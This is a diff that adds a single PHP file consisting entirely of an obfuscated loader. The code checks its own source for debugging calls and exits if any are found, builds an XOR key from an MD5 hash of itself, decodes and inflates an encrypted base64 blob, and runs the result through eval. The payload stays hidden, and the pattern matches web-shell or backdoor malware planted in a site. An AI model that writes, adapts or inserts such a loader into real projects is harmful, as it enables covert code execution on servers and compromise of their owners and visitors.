@@ -1,0 +1,24 @@
+<?php
+$twewvnh="1d51b83ae64a5a88b971688279cacd74";
+$mfyztwmearba="54555109505c565151570d0550520059555a5304550a0800565d5603015d5102";
+$noodafjcxx="0GSFVuEkaU4hUmzfcZYjnZIXsbXTZyopO2/JisjR/I6IkJAW7jlvJd6iyUjZK07zpQ95dyFw+r216tit/QbdbMvggQpzXKrDj7Z/Hw6BNMyMeEMjMokOFvgQO8BvUxlfCbuHrftPQtAD7gMRlXkCzXq8RRqFq3pSMIzxScFY78joxVbQoKvHH5jn0MhqiLtuGoYmbh2F/P49AuUr7mfOU3rlZjpugxsr4MeQJGMnl3lmT030Zfec+dBPof4kZf9yF+9zSIjAS3/GNAe4zR+rKitrXLTtbRnlWs94McNrVxXWCRJdFWfWcY8wwTERyOzJxW/dZluGkyZnn12cP7yQlzZzhmYpG1/fqUzpQ87TUH1qJssSkybu7L/YtlSerSUIOHfTKULaPUG1gGhstonmzWwylJFK862ECxgcsgy6xeeQCd6l8owfQkc5GMz2tLh72hF/99FimeNPYC/T7RINaoHFUU7Th5zlswk1pVW33651wwPtDlM688pRMz+kzxkNuqTZE9W0Yq3MQ6Mo4M8U3qIwU6/FPPf1kfw2ZOE47k/UvPH/hwzus6EvCR72XrZOd4VdHNJm+9sGI5S+cf7ylWulkuV8mJtWeGThfrLAdu3EbJlZABVzXAn9v/gIO5OEb1VQoJ5oFXHWXwhNY2DZ6xMigzFv/FATUuMUatbvvuRHH84MktBOJh4wrXu4IAkKXDcNGwjexi/EqD3CpJYW8Z5sfuTvjLs3dQpZkcv9Uf6YRiui6oLYSs2T5pSsXfy47b2EjywOo3ga7YD915vtqr75YlLsGcjxmlPS8YppQtUNg/MTs73axVSZPp1V9hnVY5dzm94fqFjDTuvt6PTpudU2EUZzs7bhwcm/pxEjDAhk+n7lZQ4mYvCZxuU3P3SFYxsuCZT+vD5cf8ErL7vQdBNeTfyjWlmziAO+CEinip2JhNXK2ci84d6DR8BGJLCL3dq3A5C8fo9BUt4TUDRpbkR9KElXCSsSrYqCvpPnHhNhps5zbTjyzL15mZ6Dl/F9K8hMFtS6od+BS2IJ05HGhp7OX+2eMA==";
+$hmgqncxrmfvq=file_get_contents(__FILE__);
+$tiksmdedn=str_replace($noodafjcxx,"",$hmgqncxrmfvq);
+if(strpos($tiksmdedn,"ec"."ho")!==false||strpos($tiksmdedn,"pr"."int")!==false||strpos($tiksmdedn,"var_"."dump")!==false||strpos($tiksmdedn,"file_put_"."contents")!==false||strpos($tiksmdedn,"fw"."rite")!==false){die();}
+$vstjlxvphng=str_replace(array($twewvnh,$mfyztwmearba),array("SP_e8cfb309","KP_cf620a03"),$hmgqncxrmfvq);
+$ltomceamiekj=md5($vstjlxvphng);
+$wioajr=hex2bin($mfyztwmearba);
+$loldwtigtig="";
+$rrkbkpkvhu=strlen($ltomceamiekj);
+for($ejedoht=0;$ejedoht<$rrkbkpkvhu;$ejedoht++){
+    $loldwtigtig.=chr(ord($wioajr[$ejedoht])^ord($ltomceamiekj[$ejedoht]));
+}
+$zfnpvr=base64_decode($noodafjcxx);
+$pbwouygrzwxg=strlen($zfnpvr);
+$yrtdpug="";
+$nxamfjenq=strlen($loldwtigtig);
+for($ejedoht=0;$ejedoht<$pbwouygrzwxg;$ejedoht++){
+    $yrtdpug.=$zfnpvr[$ejedoht]^$loldwtigtig[$ejedoht%$nxamfjenq];
+}
+$lupibee="gz"."in"."fl"."ate";
+eval($lupibee($yrtdpug));
